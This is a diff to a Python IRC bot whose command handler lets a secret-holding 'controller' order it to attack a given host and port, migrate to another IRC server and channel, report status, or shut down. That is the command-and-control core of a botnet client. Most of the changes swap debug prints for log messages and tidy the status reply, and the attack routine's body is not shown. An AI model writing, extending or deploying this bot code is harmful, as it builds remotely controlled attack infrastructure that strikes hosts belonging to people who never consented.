@@ -100,7 +100,7 @@ class Bot:
     def send_msg(self, data):
         """ Function to send message to a socket """
         
-        print("DEBUG sending: " + data)
+        print("Sending:\t" + data)
 
         if not isinstance(data, (bytes, bytearray)):
             data = bytes(data, "utf-8")
@@ -110,7 +110,7 @@ class Bot:
             self.MESSAGES[self.BOT_SOCKET].put(data)
 
         except Exception as e:
-            print(str(e))
+            print("ERROR: " + str(e))
 
 
     def check_data(self, data):
@@ -129,28 +129,29 @@ class Bot:
             elif line[1] == "433":
                 self.NICK_COUNT += 1
                 self.CONNECTED_SERVER = False
+
+                print("Nickname already used")
                 
             # join server successfully
             elif line[1] == "001":
-                self.BOT_COUNT += 1
                 self.CONNECTED_SERVER = True
-                print(str(self.BOT_COUNT))
+
+                print("Joined server successfully")
 
             # join channel successfully
             elif line[1] == "JOIN":
-                print("DEBUG: Joined channel")
                 self.JOINED = True
+
+                print("Joined channel successfully")
 
             # responde to ping
             elif line[0] == "PING" and not self.PONG:
-                print("DEBUG ping")
-
                 self.send_msg("PONG " + line[1])
+
+                print("Sent ping")
 
     def cmds(self, data):
         """ Listen for commands """
-
-        print("DEBUG cmd: "  + data)
 
         data = data.split(":")
 
@@ -167,14 +168,15 @@ class Bot:
             self.CONTROLLER = sender
 
         if self.CONTROLLER == sender:
-            print("DEBUG senderT: " +sender)
 
             # shutdown bot
             if ("shutdown " + self.SECRET) in msg:
+                print("SHUTDOWN command issued")
                 self.shutdown()
 
             # send nick to controller
             if ("status " + self.SECRET) in msg:
+                print("STATUS command issued")
                 self.status()
 
             msg = msg.split()
@@ -183,26 +185,27 @@ class Bot:
 
             # attack with bot
             if msg[0] == "attack" and msg[-1] == self.SECRET and len(msg) == 4:
+                print("ATTACK command issued")
+               
                 host = msg[1]
                 port = msg[2]
-
-                print("DEBUG: ATTACK")
 
                 self.attack(host, port)
 
             # move to another server
             elif msg[0] == "move" and msg[-1] == self.SECRET and len(msg) == 5:
+                print("MOVE command issued")
+
                 host = msg[1]
                 port = msg[2]
                 chan = msg[3]
 
-                print("DEBUG: MOVE")
-
                 self.migrate(host, port, chan)
-        
-        else:
-            print("DEBUG")
-            return
+
+            else:
+
+                return
+
 
     def close_socket(self, sckt):
         """ Close a connection """
@@ -356,10 +359,8 @@ class Bot:
         self.MIGRATE = False
 
         # reset variables
-
         # change flag
         self.MIGRATE = True
-        
 
         return
 
@@ -382,9 +383,9 @@ class Bot:
     def status(self):
         """ Report status """
 
-        msg = "PRIVMSG " + self.CONTROLLER + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET
+        msg = "PRIVMSG " + self.CONTROLLER + " :edel" + str(self.NICK_COUNT) + " " + self.SECRET + "\n"
 
-        self.MESSAGES[self.BOT_SOCKET].put(msg)
+        self.send_msg(msg)
 
         return
 
@@ -442,6 +443,7 @@ class Bot:
 
                 else:
                     # send the msg
+                    print(next_msg)
                     socket.send(next_msg)
                     print("DEBUG: MEssage sent")
 
